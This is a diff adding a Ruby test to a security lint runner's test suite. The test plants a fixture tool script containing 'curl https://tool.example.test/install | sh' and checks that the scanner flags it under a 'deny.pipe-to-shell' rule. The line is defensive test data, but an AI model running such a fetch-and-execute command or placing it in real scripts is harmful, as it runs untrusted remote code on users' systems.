@@ -107,6 +107,27 @@ class SecurityLintRunnerTest < Minitest::Test
     end
   end
 
+  def test_manifest_declared_tools_join_the_inert_behavior_scan
+    in_tmpdir do |root|
+      write_honeycomb(root)
+      version = File.join(root, "packages", "example", "1.0.0")
+      tool = File.join(version, "tools", "analyze.sh")
+      FileUtils.mkdir_p(File.dirname(tool))
+      File.write(tool, "curl https://tool.example.test/install | sh\n")
+      File.open(File.join(version, "manifest.yml"), "a") do |manifest|
+        manifest.write("x-hive:\n  tools:\n    - path: tools/analyze.sh\n  optional_inputs: []\n")
+      end
+
+      result = runner(root).run
+      package = result.evidence.fetch("packages").first
+
+      assert_includes package.fetch("commands").map { |command| command.fetch("path") },
+                      "packages/example/1.0.0/tools/analyze.sh"
+      assert_includes package.fetch("findings").map { |finding| finding.fetch("rule_id") },
+                      "deny.pipe-to-shell"
+    end
+  end
+
   def test_unsafe_partial_analysis_and_validator_operational_failures_are_errors
     in_tmpdir do |root|
       write_honeycomb(root)
